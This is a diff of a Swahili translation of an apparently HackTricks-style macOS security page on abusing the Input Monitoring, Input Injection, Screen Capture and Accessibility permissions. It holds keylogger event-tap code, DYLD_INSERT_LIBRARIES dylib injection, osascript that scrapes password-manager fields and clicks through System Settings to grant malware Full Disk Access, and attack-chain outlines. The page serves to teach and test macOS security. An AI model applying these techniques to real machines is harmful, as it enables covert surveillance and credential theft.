@@ -1,31 +1,31 @@
-# Abuse of macOS Input Monitoring, Screen Capture & Accessibility
+# Matumizi Mabaya ya Input Monitoring, Screen Capture na Accessibility kwenye macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Muhtasari
 
-Huduma tatu zinazohusiana za TCC hudhibiti jinsi applications zinavyoweza kuchunguza na kuingiliana na desktop session ya mtumiaji:
+Huduma tatu zinazohusiana za TCC hudhibiti jinsi applications zinavyoweza kuchunguza na kuingiliana na session ya desktop ya mtumiaji:
 
-| TCC Service | Ruhusa | Uwezo |
+| Huduma ya TCC | Ruhusa | Uwezo |
 |---|---|---|
-| `kTCCServiceListenEvent` | **Input Monitoring** | Kusoma keyboard na mouse events zote katika mfumo mzima (keylogging) |
-| `kTCCServicePostEvent` | **Input Injection** | Kuingiza synthetic keyboard na mouse events |
-| `kTCCServiceScreenCapture` | **Screen Capture** | Kusoma display buffer, kupiga screenshots, na kurekodi screen |
-| `kTCCServiceAccessibility` | **Accessibility** | Kudhibiti applications nyingine kupitia AXUIElement API na kusoma UI elements |
+| `kTCCServiceListenEvent` | **Input Monitoring** | Kusoma matukio yote ya keyboard na mouse kwenye mfumo mzima (keylogging) |
+| `kTCCServicePostEvent` | **Input Injection** | Kuingiza matukio bandia ya keyboard na mouse |
+| `kTCCServiceScreenCapture` | **Screen Capture** | Kusoma display buffer, kuchukua screenshots, na kurekodi screen |
+| `kTCCServiceAccessibility` | **Accessibility** | Kudhibiti applications nyingine kupitia AXUIElement API, na kusoma vipengele vya UI |
 
-Ruhusa hizi ni **mchanganyiko hatari zaidi** kwenye macOS — kwa pamoja hutoa:
-- Keylogging kamili ya kila keystroke (passwords, messages, credit cards)
-- Screen recording ya maudhui yote yanayoonekana
-- Synthetic input injection (kubofya buttons na kuidhinisha dialogs)
-- Udhibiti kamili wa GUI unaolingana na physical access
+Ruhusa hizi ni **mchanganyiko hatari zaidi kwenye macOS** — kwa pamoja hutoa:
+- Keylogging kamili ya kila mbonyezo wa keyboard (passwords, messages, credit cards)
+- Kurekodi screen ya maudhui yote yanayoonekana
+- Kuingiza synthetic input (kubofya buttons, kuidhinisha dialogs)
+- Udhibiti kamili wa GUI sawa na access ya kimwili
 
 ---
 
-## Input Monitoring (kTCCServiceListenEvent)
+## Ufuatiliaji wa Input (kTCCServiceListenEvent)
 
 ### Jinsi Inavyofanya Kazi
 
-macOS hutumia **`CGEventTap` API** kuruhusu processes kuingilia input events kutoka kwenye Quartz event system. Process yenye ListenEvent permission inaweza kuunda event tap inayopokea **kila keyboard na mouse event** kabla au baada ya kufika kwenye target application.<sup>[[1]](#references)</sup>
+macOS hutumia **`CGEventTap` API** kuruhusu processes kukatiza input events kutoka kwenye Quartz event system. Process yenye ruhusa ya ListenEvent inaweza kuunda event tap inayopokea **kila keyboard na mouse event** kabla au baada ya kufika kwenye target application.<sup>[[1]](#references)</sup>
 ```objc
 // Create an event tap that captures all key-down events
 CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
@@ -59,9 +59,9 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
 ```
-### Attack: Keylogging kupitia Code Injection
+### Attack: Keylogging via Code Injection
 
-Ikiwa binary yenye ruhusa ya ListenEvent pia ina **disabled library validation** au **inaruhusu DYLD environment variables**, mshambuliaji anaweza kuingiza dylib inayosajili CGEventTap:
+Ikiwa binary yenye ruhusa ya ListenEvent pia ina **disabled library validation** au **allows DYLD environment variables**, attacker anaweza ku-inject dylib inayosajili CGEventTap:
 ```bash
 # Check if the target allows code injection
 codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
@@ -70,11 +70,11 @@ grep -E "allow-dyld|disable-library-validation"
 # If both are present, inject a keylogger dylib:
 DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
 ```
-The injected dylib hurithi ListenEvent TCC grant ya target na kunasa keystrokes zote.
+Dylib iliyoingizwa hurithi idhini ya TCC ya ListenEvent ya target na kunasa mibofyo yote ya vitufe.
 
 ### Attack: Credential Harvesting
 
-Keylogger ya kisasa inaweza kuhusisha keystrokes na application inayotumika:
+Keylogger ya kisasa inaweza kuhusisha mibofyo ya vitufe na programu amilifu:
 ```objc
 // Get the frontmost application to contextualize keystrokes
 NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
@@ -85,11 +85,11 @@ NSString *appName = frontApp.localizedName;
 ```
 ---
 
-## Uingizaji wa Input (kTCCServicePostEvent)
+## Input Injection (kTCCServicePostEvent)
 
 ### Jinsi Inavyofanya Kazi
 
-Ruhusa ya PostEvent inaruhusu kuunda event tap kwa **`kCGEventTapOptionDefault`** (inaweza kurekebisha/kuingiza events) badala ya ListenOnly.<sup>[[1]](#references)</sup> Hii huwezesha:
+PostEvent permission huruhusu kuunda event tap yenye **`kCGEventTapOptionDefault`** (inaweza kurekebisha/kuingiza events) badala ya ListenOnly.<sup>[[1]](#references)</sup> Hii huwezesha:
 ```objc
 // Inject a keystroke
 CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
@@ -103,9 +103,9 @@ CGPointMake(100, 200),
 kCGMouseButtonLeft);
 CGEventPost(kCGSessionEventTap, click);
 ```
-### Attack: Uidhinishaji wa Kiotomatiki wa TCC Prompt
+### Shambulio: Uidhinishaji Otomatiki wa TCC Prompt
 
-Kwa kutumia PostEvent, mshambuliaji anaweza **kuiga kubofya "Allow"** kwenye dialog za ruhusa za TCC:
+Kwa kutumia PostEvent, mshambuliaji anaweza **kuiga kubofya "Allow"** kwenye dialogi za ruhusa za TCC:
 ```bash
 # Using cliclick (if available) or direct CGEvent injection:
 # 1. Trigger a TCC prompt for the malware
@@ -115,14 +115,14 @@ Kwa kutumia PostEvent, mshambuliaji anaweza **kuiga kubofya "Allow"** kwenye dia
 ```
 ---
 
-## Kukamata Skrini (kTCCServiceScreenCapture)
+## Uchukuzi wa Skrini (kTCCServiceScreenCapture)
 
 ### Jinsi Inavyofanya Kazi
 
-Ruhusa ya kukamata skrini inaruhusu kusoma display buffer kwa kutumia:
-- **`CGWindowListCreateImage`** — kukamata dirisha lolote au skrini nzima
+Ruhusa ya kuchukua picha ya skrini inaruhusu kusoma display buffer kwa kutumia:
+- **`CGWindowListCreateImage`** — kunasa dirisha lolote au skrini nzima
 - **`ScreenCaptureKit`** (macOS 12.3+) — API ya kisasa ya kutiririsha maudhui ya skrini<sup>[[3]](#references)</sup>
-- **`CGDisplayStream`** — kukamata skrini kwa kuongeza kasi kwa kutumia hardware
+- **`CGDisplayStream`** — kunasa skrini kwa acceleration ya hardware
 ```objc
 // Capture the entire main display
 CGImageRef screenshot = CGWindowListCreateImage(
@@ -133,7 +133,7 @@ kCGWindowImageDefault
 );
 // screenshot contains everything visible on screen
 ```
-### Kutafuta Wateja wa Screen Capture
+### Kutafuta Clients za Screen Capture
 ```bash
 # TCC database query
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -143,9 +143,9 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 sqlite3 /tmp/executables.db "
 SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
 ```
-### Attack: Kukamata Credentials kupitia OCR
+### Attack: Credential Capture via OCR
 
-Mchakato wa screen capture uliodungwa unaweza kunasa fremu mara kwa mara na kutumia OCR kutoa nywila:
+Mchakato wa screen capture uliodungwa unaweza kunasa fremu mara kwa mara na kutumia OCR kutoa passwords:
 ```bash
 # Basic screen capture from a process with the TCC grant
 screencapture -x /tmp/screen.png
@@ -154,11 +154,11 @@ screencapture -x /tmp/screen.png
 screencapture -x -l <windowID> /tmp/window.png
 ```
 > [!WARNING]
-> Kuanzia **macOS Sonoma**, screen capture huonyesha **kiashirio kinachoendelea kuonekana** kwenye upau wa menyu. Kwenye matoleo ya zamani, screen recording ingeweza kufanyika bila kutoa dalili yoyote. Hata hivyo, kunasa fremu moja kwa muda mfupi bado kunaweza kutotambuliwa na watumiaji.
+> Kuanzia **macOS Sonoma**, screen capture huonyesha **kiashiria kinachoendelea** kwenye menu bar. Kwenye matoleo ya zamani, screen recording ingeweza kufanyika kimya kabisa. Hata hivyo, capture fupi ya frame moja bado inaweza kupita bila watumiaji kuigundua.
 
 ### Attack: Session Recording
 
-Screen recording inayoendelea hutoa replay kamili ya session ya mtumiaji:
+Continuous screen recording hutoa replay kamili ya session ya mtumiaji:
 ```objc
 // Using ScreenCaptureKit for streaming capture (macOS 12.3+)
 // This captures frames continuously with minimal CPU impact
@@ -170,17 +170,17 @@ config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
 ```
 ---
 
-## Ufikivu (kTCCServiceAccessibility)
+## Accessibility (kTCCServiceAccessibility)
 
 ### Jinsi Inavyofanya Kazi
 
-Ufikiaji wa Ufikivu hutoa udhibiti wa programu nyingine kupitia **AXUIElement API**.<sup>[[2]](#references)</sup> Mchakato wenye ufikivu unaweza:
+Ufikiaji wa Accessibility hutoa udhibiti wa applications nyingine kupitia **AXUIElement API**.<sup>[[2]](#references)</sup> Process yenye accessibility inaweza:
 
-1. **Kusoma** kipengele chochote cha UI katika programu yoyote (sehemu za maandishi, lebo, vitufe, menyu)
-2. **Kubofya** vitufe na kuingiliana na vidhibiti
-3. **Kuchapa** maandishi katika sehemu yoyote ya maandishi
-4. **Kuelekeza** menyu na madirisha ya mazungumzo
-5. **Kukusanya** data inayoonyeshwa kutoka kwa programu yoyote inayoendesha
+1. **Kusoma** kipengele chochote cha UI katika application yoyote (sehemu za maandishi, labels, buttons, menus)
+2. **Kubofya** buttons na kuingiliana na controls
+3. **Kuingiza** maandishi katika sehemu yoyote ya maandishi
+4. **Kuelekeza** menus na dialogs
+5. **Kukusanya** data inayoonyeshwa kutoka kwenye application yoyote inayoendeshwa
 ```objc
 // Get the frontmost application
 AXUIElementRef app = AXUIElementCreateApplication(pid);
@@ -197,7 +197,7 @@ AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
 ```
 ### Attack: Self-Granting TCC Permissions
 
-Matumizi mabaya hatari zaidi ya Accessibility ni **kuvinjari System Settings ili kuipa malware yako mwenyewe permissions za ziada**:
+Unyanyasaji hatari zaidi wa accessibility ni kuvinjari System Settings ili kuipa malware yako mwenyewe permissions za ziada.<sup>[[4]](#references)</sup>
 ```bash
 # Using osascript with accessibility access:
 # Navigate to Privacy & Security > Full Disk Access
@@ -214,7 +214,7 @@ tell process "System Settings"
 end tell
 end tell'
 ```
-### Shambulio: Ukusanyaji wa Data Kati ya Programu
+### Shambulio: Kukusanya Data Kati ya Applications
 ```bash
 # Read data from any application's UI
 osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'
@@ -225,7 +225,7 @@ osascript -e 'tell application "System Events" to get name of every window of ev
 # Scrape password manager display (if unlocked and visible)
 osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
 ```
-### Attack: Automated User Actions
+### Shambulio: Automated User Actions
 ```bash
 # Click a specific UI element
 osascript -e '
@@ -243,7 +243,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 
 ## Minyororo ya Mashambulizi
 
-### Mnyororo: Input Monitoring + Screen Capture = Ufuatiliaji Kamili
+### Chain: Input Monitoring + Screen Capture = Ufuatiliaji Kamili
 ```
 1. Inject into binary with ListenEvent + ScreenCapture
 2. CGEventTap captures all keystrokes
@@ -251,7 +251,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 4. Correlate: keystroke timing + active window + screen content
 5. Result: passwords, private messages, financial data
 ```
-### Msururu: Accessibility + PostEvent = Udhibiti Kamili wa Mbali
+### Mlolongo: Accessibility + PostEvent = Udhibiti Kamili wa Mbali
 ```
 1. Inject into binary with Accessibility + PostEvent
 2. Use AXUIElement to read current screen state
@@ -260,7 +260,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 5. Open Terminal, type commands as if the user did it
 6. Result: equivalent to physical keyboard/mouse access
 ```
-### Mnyororo: Accessibility → Kujipa Ruhusa ya Kamera/Mic → Ufuatiliaji
+### Msururu: Accessibility → Kujipa Ruhusa ya Camera/Mic → Ufuatiliaji
 ```
 1. Start with only Accessibility permission
 2. Open System Settings > Privacy & Security > Camera
@@ -290,11 +290,10 @@ SELECT path FROM executables
 WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
 AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
 ```
-## Marejeo
+## References
 
 - [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
 - [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
 - [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
-- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)
-
+- [4] [Objective-See — Synthetic events and user-interface security on macOS](https://objective-see.org/blog/blog_0x36.html)
 {{#include ../../../banners/hacktricks-training.md}}
